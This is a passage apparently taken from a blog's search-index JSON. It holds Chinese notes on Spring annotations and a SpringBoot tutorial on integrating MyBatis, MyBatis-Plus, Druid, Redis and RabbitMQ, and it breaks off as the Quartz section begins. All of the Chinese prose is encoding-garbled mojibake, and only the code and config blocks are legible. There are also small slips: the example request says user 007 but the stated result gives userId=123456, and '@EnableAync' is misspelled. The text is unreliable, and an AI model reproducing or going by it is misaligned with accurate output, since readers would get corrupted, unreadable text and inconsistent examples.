æ¡†æ¶ä¸­éƒ½ç”¨åˆ°äº†å“ªäº›è®¾è®¡æ¨¡å¼ï¼Ÿ\n\n\n\n\n\n\n\n\n\n# 2.SpringMVC\n\n- Spring MVC çš„åŸç†å’Œæµç¨‹ï¼Ÿ\n- Spring MVC å¦‚ä½•å¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼Ÿ\n\n\n\n\n\n# 3.SpringBoot\n\n- SpringBoot æ˜¯å¦‚ä½•è¿›è¡Œè‡ªåŠ¨é…ç½®çš„ï¼Ÿ\n\n\n\n\n\n# 4.æ³¨è§£\n\n## 1. å£°æ˜bean\n\n- `@Component`ï¼šé€šç”¨çš„æ³¨è§£ï¼Œå¯æ ‡æ³¨ä»»æ„ç±»ä¸º `Spring` ç»„ä»¶ã€‚\n  - å¦‚æœä¸€ä¸ª Bean ä¸çŸ¥é“å±äºå“ªä¸ªå±‚ï¼Œå¯ä»¥ä½¿ç”¨`@Component` æ³¨è§£æ ‡æ³¨ã€‚\n\n- `@Controller`ï¼šå¯¹åº” Spring MVC æ§åˆ¶å±‚ï¼Œå³Controllerå±‚\n\n- `@Service`ï¼šå¯¹åº”æœåŠ¡å±‚ï¼Œå³Serviceå±‚\n\n- `@Repository`ï¼šå¯¹åº”æŒä¹…å±‚ï¼Œå³ Dao å±‚\n\n## 2. è‡ªåŠ¨æ³¨å…¥\n\n@Autowiredã€@Resourceã€@Qualifierã€@Value\n\n- @AutowiredæŒ‰ç…§ç±»å‹ï¼ˆByTypeï¼‰æ³¨å…¥ï¼Œå½“ä¸€ä¸ªæ¥å£å­˜åœ¨å¤šä¸ªå®ç°ç±»çš„æƒ…å†µä¸‹ï¼Œç”¨@Qualifieråˆ¶å®šå…·ä½“çš„åç§°\n- @ResourceæŒ‰ç…§åç§°ï¼ˆByNameï¼‰æ³¨å…¥ï¼Œå½“ä¸€ä¸ªæ¥å£å­˜åœ¨å¤šä¸ªå®ç°ç±»çš„æƒ…å†µä¸‹ï¼Œç”¨nameå±æ€§æŒ‡å®šå…·ä½“çš„åç§°\n\n## 3. é…ç½®ç›¸å…³\n\n@Configurationã€@Beanã€@ComponentScanï¼ˆæ‰«æBeanï¼‰\n\n\n\n## è¯»å–é…ç½®ä¿¡æ¯\n\n\n\n## AOPç›¸å…³\n\n@Aspectã€@PointCutã€@Beforeã€@Afterã€@Around\n\n## å¼‚æ­¥ç›¸å…³\n\n@EnableAyncã€@Async\n\n\n\n## å‰åç«¯ä¼ å€¼\n\n- `@PathVariable`ï¼šç”¨äºè·å–è·¯å¾„å‚æ•°ã€‚ç”¨äºå°†è·¯å¾„å‚æ•°æ•°æ®æ˜ å°„åˆ°æ§åˆ¶å™¨æ–¹æ³•çš„å‚æ•°ä¸Š\n\n- `@RequestParam`ï¼šç”¨äºè·å–æŸ¥è¯¢å‚æ•°ã€‚ç”¨äºå°†è¯·æ±‚å‚æ•°åŒºæ•°æ®æ˜ å°„åˆ°æ§åˆ¶å™¨æ–¹æ³•çš„çš„å‚æ•°ä¸Š\n\n------\n\nå¦‚æœè¯·æ±‚çš„ url æ˜¯ï¼š`/user/007/info?userName=Tom`\n\n```java\n@GetMapping(\"/user/{userId}/info\")\npublic List<Teacher> getIdAndName(\n         @PathVariable(\"userId\") Long userId,\n         @RequestParam(value = \"userName\", required = falseï¼ŒdefaultValue = \"anonymous\") String userName ) {\n...\n}\n```\n\næœåŠ¡è·å–åˆ°çš„æ•°æ®å°±æ˜¯ï¼š`userId=123456,userName=Tom`\n\n\n\n## è¯·æ±‚ç›¸å…³\n\n- `@RequestMapping`ï¼šæ˜ å°„è¯·æ±‚url\n\n- `@RequestParam`ï¼šè·å–è¯·æ±‚è·¯å¾„åé¢çš„å‚æ•°å€¼\n\n- `@PathVariable`ï¼šç”¨äºè·å–è·¯å¾„å‚æ•°ã€‚\n\n- `@RequestBody`ï¼šè·å–è¯·æ±‚ä½“ä¸Šçš„å‚æ•°å€¼\n\n- `@ResponseBody`ï¼šæ¥å£è¿”å›ä»¥jsonçš„å½¢å¼\n\n- `@RestController`ï¼š`@Controller`å’Œ`@ResponseBody`çš„åˆé›†\n\n  \n\n## å¼‚å¸¸å¤„ç†ç›¸å…³\n\n- @ControllerAdviceï¼šå®šä¹‰å…¨å±€å¼‚å¸¸å¤„ç†ç±»\n- @ExceptionHandlerï¼šå£°æ˜å¼‚å¸¸å¤„ç†æ–¹æ³•\n\n\n\n# å‚è€ƒ\n\n- [ã€å…«è‚¡æ–‡ã€‘Springç¯‡_çˆ±åƒé±¼é¥¼çš„çŒ«çš„åšå®¢](https://blog.csdn.net/weixin_45325628/article/details/122907131)\n- [Springé¢è¯•-ç¨‹åºå‘˜å¤§å½¬ (topjavaer.cn)](http://topjavaer.cn/framework/spring.html)\n- [springå…«è‚¡æ–‡ - æ˜é‡‘ (juejin.cn)](https://juejin.cn/post/7101690001447976967#heading-1)\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["Spring","SpringMVC","SpringBoot"],"categories":["Spring"]},{"title":"SpringBoot-æ•´åˆç¯‡","url":"/posts/58591.html","content":"\n> æ•´åˆç¯‡åŒ…å«SpringBootå¯¹å„ç§ç¬¬ä¸‰æ–¹æŠ€æœ¯çš„æ•´åˆã€‚ä¾‹å¦‚SQLã€NoSQLã€ç¼“å­˜ã€æ¶ˆæ¯é˜Ÿåˆ—ã€å®šæ—¶ä»»åŠ¡ã€æ–‡æ¡£æ“ä½œã€è®¤è¯æˆæƒã€æ¶ˆæ¯é€šçŸ¥ç­‰ç­‰\n\nå°ç®€ä» 0 å¼€å§‹å­¦ Java çŸ¥è¯†ä¹‹ [Java-å­¦ä¹ è·¯çº¿](https://jwt1399.top/posts/29829.html) ä¸­çš„ã€ŠSpringBoot-æ•´åˆç¯‡ã€‹ï¼Œä¸å®šæœŸæ›´æ–°æ‰€å­¦ç¬”è®°ï¼ŒæœŸå¾…ä¸€å¹´åçš„èœ•å˜å§ï¼<æœ‰åŒæ ·æƒ³æ³•çš„å°ä¼™ä¼´ï¼Œå¯ä»¥è”ç³»æˆ‘ä¸€èµ·äº¤æµå­¦ä¹ å“¦ï¼>\n\n- [x] ğŸš©æ—¶é—´å®‰æ’ï¼šæœ¬ç¯‡é•¿æœŸæ›´æ–°\n- [x] ğŸ¯å¼€å§‹æ—¶é—´ï¼š09-15\n- [x] ğŸ‰ç»“æŸæ—¶é—´ï¼šâˆ\n\n## 1.æ•´åˆSQL\n\n### â‘ MyBatis\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥ MyBatis çš„ starter å’Œå¯¹åº”æ•°æ®åº“çš„åæ ‡ï¼Œæˆ–è€…åˆ›å»ºé¡¹ç›®æ—¶å‹¾é€‰è¦ä½¿ç”¨çš„æŠ€æœ¯\n\n```xml\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®æ•°æ®æºç›¸å…³ä¿¡æ¯ï¼Œæ²¡æœ‰è¿™ä¸ªä¿¡æ¯ä½ è¿æ¥å“ªä¸ªæ•°æ®åº“éƒ½ä¸çŸ¥é“\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n    username: root\n    password: root\n```\n\n**æµ‹è¯•**\n\n- æµ‹è¯•è¡¨\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `type` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, 'ä¸‰ä½“', 'ç§‘å¹»', 'å¤§åˆ˜çš„å·…å³°ä¹‹ä½œï¼Œå°†ä¸­å›½ç§‘å¹»æ¨å‘ä¸–ç•Œèˆå°ã€‚æ€»å…±åˆ†ä¸ºä¸‰éƒ¨æ›²ï¼šã€Šåœ°çƒå¾€äº‹ã€‹ã€ã€Šé»‘æš—æ£®æ—ã€‹ã€ã€Šæ­»ç¥æ°¸ç”Ÿã€‹ã€‚');\nINSERT INTO `tbl_book` VALUES (2, 'æ ¼æ—ç«¥è¯', 'ç«¥è¯', 'ç¡å‰æ•…äº‹ã€‚');\nINSERT INTO `tbl_book` VALUES (3, 'Spring 5è®¾è®¡æ¨¡å¼', 'è®¡ç®—æœºç†è®º', 'æ·±å…¥Springæºç å‰–æSpringæºç ä¸­è•´å«çš„10å¤§è®¾è®¡æ¨¡å¼');\n\nSET FOREIGN_KEY_CHECKS = 1;\n```\n\n- å®ä½“ç±»\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- æ˜ å°„æ¥å£ï¼ˆDaoï¼‰\n\n```java\n@Mapper\npublic interface BookDao {\n    @Select(\"select * from tbl_book where id = #{id}\")\n    public Book getById(Integer id);\n}\n```\n\n- æµ‹è¯•ç±»\n\n```java\n@SpringBootTest\nclass Springboot05MybatisApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.getById(1));\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. æ•´åˆæ“ä½œéœ€è¦å‹¾é€‰MyBatisæŠ€æœ¯ï¼Œä¹Ÿå°±æ˜¯å¯¼å…¥MyBatiså¯¹åº”çš„starter\n\n2. æ•°æ®åº“è¿æ¥ç›¸å…³ä¿¡æ¯è½¬æ¢æˆé…ç½®\n\n3. æ•°æ®åº“SQLæ˜ å°„éœ€è¦æ·»åŠ @Mapperè¢«å®¹å™¨è¯†åˆ«åˆ°\n\n4. MySQL 8.Xé©±åŠ¨å¼ºåˆ¶è¦æ±‚è®¾ç½®æ—¶åŒº\n\n   - ä¿®æ”¹urlï¼Œæ·»åŠ serverTimezoneè®¾å®š\n   - ä¿®æ”¹MySQLæ•°æ®åº“é…ç½®ï¼šä¿®æ”¹mysqlä¸­çš„é…ç½®æ–‡ä»¶mysql.iniï¼Œåœ¨mysqldé¡¹ä¸­æ·»åŠ default-time-zone=+8:00\n\n5. é©±åŠ¨ç±»è¿‡æ—¶ï¼Œæé†’æ›´æ¢ä¸ºcom.mysql.cj.jdbc.Driver\n\n### â‘¡MyBatis-Plus\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„ starter å’Œæ•°æ®åº“é©±åŠ¨\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.4.3</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®æ•°æ®æºç›¸å…³ä¿¡æ¯\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db\n    username: root\n    password: root\n```\n\n**æ­¥éª¤â‘¢**ï¼šé…ç½®è¡¨åçš„é€šç”¨å‰ç¼€å\n\næ•°æ®åº“çš„è¡¨åå®šä¹‰è§„åˆ™æ˜¯tbl_æ¨¡å—åç§°ï¼Œä¸ºäº†èƒ½å’Œå®ä½“ç±»ç›¸å¯¹åº”ï¼Œéœ€è¦è®¾ç½®æ‰€æœ‰è¡¨åçš„é€šç”¨å‰ç¼€å\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\t\t#è®¾ç½®æ‰€æœ‰è¡¨çš„é€šç”¨å‰ç¼€åç§°ä¸ºtbl_\n```\n\n**æ­¥éª¤â‘£**ï¼šé…ç½®è¿è¡Œæ—¥å¿—\n\né€šè¿‡é…ç½®è¿è¡Œæ—¥å¿—å°±å¯ä»¥æŸ¥é˜…æ‰§è¡Œæ—¶çš„SQLè¯­å¥\n\n```yaml\nmybatis-plus:\n  global-config:\n    db-config:\n      table-prefix: tbl_\n      id-type: auto\n  configuration:\n    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #é…ç½®æ—¥å¿—\n```\n\n**æµ‹è¯•**\n\n- å®ä½“ç±»\n\n```java\npublic class Book {\n    private Integer id;\n    private String type;\n    private String name;\n    private String description;\n}\n```\n\n- æ˜ å°„æ¥å£ï¼ˆDaoï¼‰\n\n```java\n@Mapper\npublic interface BookDao extends BaseMapper<Book> {\n}\n```\n\næ ¸å¿ƒåœ¨äºDaoæ¥å£ç»§æ‰¿äº†ä¸€ä¸ªBaseMapperçš„æ¥å£ï¼Œè¿™ä¸ªæ¥å£ä¸­å¸®åŠ©å¼€å‘è€…é¢„å®šäº†è‹¥å¹²ä¸ªå¸¸ç”¨çš„APIæ¥å£ï¼Œç®€åŒ–äº†é€šç”¨APIæ¥å£çš„å¼€å‘å·¥ä½œã€‚\n\n- æµ‹è¯•ç±»\n\n```java\n@SpringBootTest\nclass SpringbootApplicationTests {\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        System.out.println(bookDao.selectById(2));\n        System.out.println(bookDao.selectList(null));\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. æ‰‹å·¥æ·»åŠ MyBatis-Pluså¯¹åº”çš„starter\n2. æ•°æ®å±‚æ¥å£ä½¿ç”¨BaseMapperç®€åŒ–å¼€å‘\n3. å€ŸåŠ©MyBatis-Plusæ—¥å¿—å¯ä»¥æŸ¥é˜…æ‰§è¡ŒSQLè¯­å¥\n4. éœ€è¦ä½¿ç”¨çš„ç¬¬ä¸‰æ–¹æŠ€æœ¯æ— æ³•é€šè¿‡å‹¾é€‰ç¡®å®šæ—¶ï¼Œéœ€è¦æ‰‹å·¥æ·»åŠ åæ ‡\n\n### â‘¢Durid\n\nå‰é¢æ•´åˆ MyBatis å’Œ MyBatis-Plus çš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ•°æ®æºå¯¹è±¡éƒ½æ˜¯SpringBooté»˜è®¤çš„æ•°æ®æºå¯¹è±¡ HiKariï¼Œä¸‹é¢æˆ‘ä»¬æ‰‹å·¥æ§åˆ¶ä¸€ä¸‹ï¼Œè‡ªå·±æŒ‡å®šäº†ä¸€ä¸ªæ•°æ®æºå¯¹è±¡ Druidã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„starter\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>com.alibaba</groupId>\n        <artifactId>druid-spring-boot-starter</artifactId>\n        <version>1.2.6</version>\n    </dependency>\n</dependencies>\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¿®æ”¹é…ç½®\n\n```yaml\nspring:\n  datasource:\n    druid:\n      driver-class-name: com.mysql.cj.jdbc.Driver\n      url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=UTC\n      username: root\n      password: root\n      \n#é™¤äº†è¿™4ä¸ªå¸¸è§„é…ç½®å¤–ï¼Œè¿˜æœ‰druidä¸“ç”¨çš„å…¶ä»–é…ç½®ã€‚é€šè¿‡æç¤ºåŠŸèƒ½å¯ä»¥æ‰“å¼€druidç›¸å…³çš„é…ç½®æŸ¥é˜…\n```\n\n**æ€»ç»“**\n\n1. æ•´åˆDruidéœ€è¦å¯¼å…¥Druidå¯¹åº”çš„starter\n2. æ ¹æ®Druidæä¾›çš„é…ç½®æ–¹å¼è¿›è¡Œé…ç½®\n\n## 2.æ•´åˆNoSQL\n\n### â‘ Redis\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥å¯¹åº”çš„ starter å’Œä¾èµ–\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-data-redis</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šä¿®æ”¹é…ç½®\n\n```yaml\nspring:\n  redis:\n    host: 127.0.0.1 #æŒ‡å®šredisæ‰€åœ¨çš„host\n    port: 6379  #æŒ‡å®šredisçš„ç«¯å£\n    password: 123456  #è®¾ç½®rediså¯†ç \n    lettuce:\n      pool:\n        max-active: 8 #æœ€å¤§è¿æ¥æ•°\n        max-idle: 8 #æœ€å¤§ç©ºé—²æ•°\n        min-idle: 0 #æœ€å°ç©ºé—²æ•°\n        max-wait: 100ms #è¿æ¥ç­‰å¾…æ—¶é—´\n```\n\n**æ­¥éª¤â‘¢**ï¼šä½¿ç”¨springbootæ•´åˆredisçš„ä¸“ç”¨å®¢æˆ·ç«¯æ¥å£æ“ä½œ\n\n- RedisTemplate\n\n```java\n@SpringBootTest\nclass SpringRedisApplicationTests {\n    @Resource\n    private RedisTemplate redisTemplate;\n    @Test\n    void testString() {\n        // 1.é€šè¿‡RedisTemplateè·å–æ“ä½œStringç±»å‹çš„ValueOperationså¯¹è±¡\n        ValueOperations ops = redisTemplate.opsForValue();\n        // 2.æ’å…¥ä¸€æ¡æ•°æ®\n        ops.set(\"name\",\"jianjian\");\n        // 3.è·å–æ•°æ®ï¼Œéœ€è¦è¿›è¡Œç±»å‹è½¬æ¢\n        String name = (String) ops.get(\"name\");\n        System.out.println(\"name = \" + name);\n    }\n}\n```\n\n- StringRedisTemplate\n\nç”±äºrediså†…éƒ¨ä¸æä¾›javaå¯¹è±¡çš„å­˜å‚¨æ ¼å¼ï¼Œå› æ­¤å½“æ“ä½œçš„æ•°æ®ä»¥å¯¹è±¡çš„å½¢å¼å­˜åœ¨æ—¶ï¼Œä¼šè¿›è¡Œè½¬ç ï¼Œè½¬æ¢æˆå­—ç¬¦ä¸²æ ¼å¼åè¿›è¡Œæ“ä½œã€‚ä¸ºäº†æ–¹ä¾¿å¼€å‘è€…ä½¿ç”¨åŸºäºå­—ç¬¦ä¸²ä¸ºæ•°æ®çš„æ“ä½œï¼Œspringbootæ•´åˆredisæ—¶æä¾›äº†ä¸“ç”¨çš„APIæ¥å£StringRedisTemplateï¼Œå¯ä»¥ç†è§£ä¸ºè¿™æ˜¯RedisTemplateçš„ä¸€ç§æŒ‡å®šæ•°æ®æ³›å‹çš„æ“ä½œAPIã€‚\n\n```JAVA\n@SpringBootTest\npublic class StringRedisTemplateTest {\n    @Autowired\n    private StringRedisTemplate stringRedisTemplate;\n    @Test\n    void get(){\n        ValueOperations<String, String> ops = stringRedisTemplate.opsForValue();\n        String name = ops.get(\"name\");\n        System.out.println(name);\n    }\n}\n```\n\n**rediså®¢æˆ·ç«¯é€‰æ‹©**\n\n> springbootæ•´åˆredisæŠ€æœ¯æä¾›äº†å¤šç§å®¢æˆ·ç«¯å…¼å®¹æ¨¡å¼ï¼Œé»˜è®¤æä¾›çš„æ˜¯lettuceå®¢æˆ·ç«¯æŠ€æœ¯ï¼Œä¹Ÿå¯ä»¥æ ¹æ®éœ€è¦åˆ‡æ¢æˆæŒ‡å®šå®¢æˆ·ç«¯æŠ€æœ¯ï¼Œä¾‹å¦‚jediså®¢æˆ·ç«¯æŠ€æœ¯ï¼Œåˆ‡æ¢æˆjediså®¢æˆ·ç«¯æŠ€æœ¯æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥jedisåæ ‡\n\n```xml\n<dependency>\n    <groupId>redis.clients</groupId>\n    <artifactId>jedis</artifactId>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®å®¢æˆ·ç«¯æŠ€æœ¯ç±»å‹ï¼Œè®¾ç½®ä¸ºjedis\n\n```yaml\nspring:\n  redis:\n    host: localhost\n    port: 6379\n    client-type: jedis\n```\n\n**æ­¥éª¤â‘¢**ï¼šæ ¹æ®éœ€è¦è®¾ç½®å¯¹åº”çš„é…ç½®\n\n```yaml\nspring:\n  redis:\n    host: localhost\n    port: 6379\n    client-type: jedis\n    lettuce:\n      pool:\n        max-active: 16\n    jedis:\n      pool:\n        max-active: 16\n```\n\n**lettcusä¸jedisåŒºåˆ«**\n\n- jedisè¿æ¥RedisæœåŠ¡å™¨æ˜¯ç›´è¿æ¨¡å¼ï¼Œå½“å¤šçº¿ç¨‹æ¨¡å¼ä¸‹ä½¿ç”¨jedisä¼šå­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ï¼Œè§£å†³æ–¹æ¡ˆå¯ä»¥é€šè¿‡é…ç½®è¿æ¥æ± ä½¿æ¯ä¸ªè¿æ¥ä¸“ç”¨ï¼Œè¿™æ ·æ•´ä½“æ€§èƒ½å°±å¤§å—å½±å“\n- lettcusåŸºäºNettyæ¡†æ¶è¿›è¡Œä¸RedisæœåŠ¡å™¨è¿æ¥ï¼Œåº•å±‚è®¾è®¡ä¸­é‡‡ç”¨StatefulRedisConnectionã€‚ StatefulRedisConnectionè‡ªèº«æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œå¯ä»¥ä¿éšœå¹¶å‘è®¿é—®å®‰å…¨é—®é¢˜ï¼Œæ‰€ä»¥ä¸€ä¸ªè¿æ¥å¯ä»¥è¢«å¤šçº¿ç¨‹å¤ç”¨ã€‚å½“ç„¶lettcusä¹Ÿæ”¯æŒå¤šè¿æ¥å®ä¾‹ä¸€èµ·å·¥ä½œ\n\n### â‘¡MongoDB\n\n\n\n### â‘¢ES\n\n\n\n## 3.æ•´åˆç¼“å­˜\n\n### â‘ Ehcache\n\n### â‘¡Redis\n\n### â‘¢Memcached\n\n## 4.æ•´åˆæ¶ˆæ¯é˜Ÿåˆ—\n\n### â‘ ActiveMQ\n\n### â‘¡RabbitMQ\n\n#### â¶å®‰è£…RabbitMQ\n\n- æ‹‰å–é•œåƒ\n\n```bash\ndocker pull rabbitmq:3-management\n```\n\n- è¿è¡Œé•œåƒ\n\n```bash\ndocker run \\\n -e RABBITMQ_DEFAULT_USER=jianjian \\\n -e RABBITMQ_DEFAULT_PASS=123321 \\\n --name mq \\\n --hostname mq1 \\\n -p 15672:15672 \\\n -p 5672:5672 \\\n -d rabbitmq:3-management\n```\n\nè®¿é—® `http://127.0.0.1:15672` å³å¯\n\n#### â·å¼•å…¥ä¾èµ–å¹¶é…ç½®\n\nå¯¼å…¥springbootæ•´åˆamqpçš„starterï¼Œamqpåè®®é»˜è®¤å®ç°ä¸ºrabbitmqæ–¹æ¡ˆ\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    <artifactId>spring-boot-starter-amqp</artifactId>\n</dependency>\n```\n\né…ç½®RabbitMQçš„æœåŠ¡å™¨åœ°å€\n\n```yaml\nspring:\n  rabbitmq:\n    host: 127.0.0.1 # ä¸»æœºå\n    port: 5672 # ç«¯å£\n    virtual-host: / # è™šæ‹Ÿä¸»æœº\n    username: jianjian # ç”¨æˆ·å\n    password: 123321 # å¯†ç     \n```\n\n**æ¡ˆä¾‹**\n\n1. åˆ©ç”¨@RabbitListenerå£°æ˜Exchangeã€Queueã€RoutingKey\n2. åœ¨consumeræœåŠ¡ä¸­ï¼Œç¼–å†™ä¸¤ä¸ªæ¶ˆè´¹è€…æ–¹æ³•ï¼Œåˆ†åˆ«ç›‘å¬direct.queue1å’Œdirect.queue2\n3. åœ¨publisherä¸­ç¼–å†™æµ‹è¯•æ–¹æ³•ï¼Œå‘jianjian. directå‘é€æ¶ˆæ¯\n\n#### â¸æ¶ˆæ¯æ¥æ”¶(direct)\n\nåœ¨consumerçš„SpringRabbitListenerä¸­æ·»åŠ ä¸¤ä¸ªæ¶ˆè´¹è€…ï¼ŒåŒæ—¶åŸºäºæ³¨è§£æ¥å£°æ˜é˜Ÿåˆ—å’Œäº¤æ¢æœºï¼š\n\n```java\n@Component\npublic class SpringRabbitListener {\n  \n    @RabbitListener(bindings = @QueueBinding(\n        value = @Queue(name = \"direct.queue1\"),\n        exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n        key = {\"red\", \"blue\"}\n    ))\n    public void listenDirectQueue1(String msg){\n        System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue1çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n    }\n\n    @RabbitListener(bindings = @QueueBinding(\n        value = @Queue(name = \"direct.queue2\"),\n        exchange = @Exchange(name = \"jianjian.direct\", type = ExchangeTypes.DIRECT),\n        key = {\"red\", \"yellow\"}\n    ))\n    public void listenDirectQueue2(String msg){\n        System.out.println(\"æ¶ˆè´¹è€…æ¥æ”¶åˆ°direct.queue2çš„æ¶ˆæ¯ï¼šã€\" + msg + \"ã€‘\");\n    }\n}\n```\n\n#### â¹æ¶ˆæ¯å‘é€(direct)\n\nåœ¨publisheræœåŠ¡ä¸­æ·»åŠ æµ‹è¯•æ–¹æ³•ï¼š\n\n```java\n@SpringBootTest\npublic class SpringAmqpTest {\n    @Test\n    public void testSendDirectExchange() {\n        // äº¤æ¢æœºåç§°\n        String exchangeName = \"jianjian.direct\";\n        // æ¶ˆæ¯\n        String message = \"çº¢è‰²è­¦æŠ¥ï¼æ—¥æœ¬ä¹±æ’æ ¸åºŸæ°´ï¼Œå¯¼è‡´æµ·æ´‹ç”Ÿç‰©å˜å¼‚ï¼ŒæƒŠç°å“¥æ–¯æ‹‰ï¼\";\n        // å‘é€æ¶ˆæ¯\n        rabbitTemplate.convertAndSend(exchangeName, \"red\", message);\n    }\n}\n```\n\n### â‘¢RocketMQ\n\n### â‘£kafka\n\n## 5.æ•´åˆå®šæ—¶ä»»åŠ¡\n\n### â‘ Quartz\n\n> QuartzæŠ€æœ¯æ˜¯ä¸€ä¸ªæ¯”è¾ƒæˆç†Ÿçš„å®šæ—¶ä»»åŠ¡æ¡†æ¶ã€‚springbootå¯¹å…¶è¿›è¡Œæ•´åˆåï¼Œç®€åŒ–äº†ä¸€ç³»åˆ—çš„é…ç½®ï¼Œå°†å¾ˆå¤šé…ç½®é‡‡ç”¨é»˜è®¤è®¾ç½®ï¼Œè¿™æ ·å¼€å‘é˜¶æ®µå°±ç®€åŒ–äº†å¾ˆå¤šã€‚\n>\n> Quartzç›¸å…³æ¦‚å¿µ\n>\n> - å·¥ä½œï¼ˆJobï¼‰ï¼šç”¨äºå®šä¹‰å…·ä½“æ‰§è¡Œçš„å·¥ä½œ\n> - å·¥ä½œæ˜ç»†ï¼ˆJobDetailï¼‰ï¼šç”¨äºæè¿°å®šæ—¶å·¥ä½œç›¸å…³çš„ä¿¡æ¯\n> - è§¦å‘å™¨ï¼ˆTriggerï¼‰ï¼šç”¨äºæè¿°è§¦å‘å·¥ä½œçš„æ‰§è¡Œè§„åˆ™ï¼Œé€šå¸¸ä½¿ç”¨cronè¡¨è¾¾å¼å®šä¹‰è§„åˆ™\n> - è°ƒåº¦å™¨ï¼ˆSchedulerï¼‰ï¼šæè¿°äº†å·¥ä½œæ˜ç»†ä¸è§¦å‘å™¨çš„å¯¹åº”å…³ç³»\n>\n> ç®€å•è¯´å°±æ˜¯ä½ å®šæ—¶å¹²ä»€ä¹ˆäº‹æƒ…ï¼Œè¿™å°±æ˜¯å·¥ä½œï¼›å·¥ä½œä¸å¯èƒ½å°±æ˜¯ä¸€ä¸ªç®€å•çš„æ–¹æ³•ï¼Œè¿˜è¦è®¾ç½®ä¸€äº›æ˜ç»†ä¿¡æ¯ï¼›å·¥ä½œå•¥æ—¶å€™æ‰§è¡Œï¼Œè®¾ç½®ä¸€ä¸ªè§¦å‘å™¨ï¼›å·¥ä½œå’Œè§¦å‘å™¨éƒ½æ˜¯ç‹¬ç«‹å®šä¹‰çš„ï¼Œå®ƒä»¬ä¸¤ä¸ªæ€ä¹ˆé…åˆåˆ°ä¸€èµ·å‘¢ï¼Ÿç”¨è°ƒåº¦å™¨ã€‚\n\n**æ­¥éª¤â‘ **ï¼šå¯¼å…¥springbootæ•´åˆQuartzçš„starter\n\n```xml\n<dependency>\n    <groupId>org.springframework.boot</groupId>\n    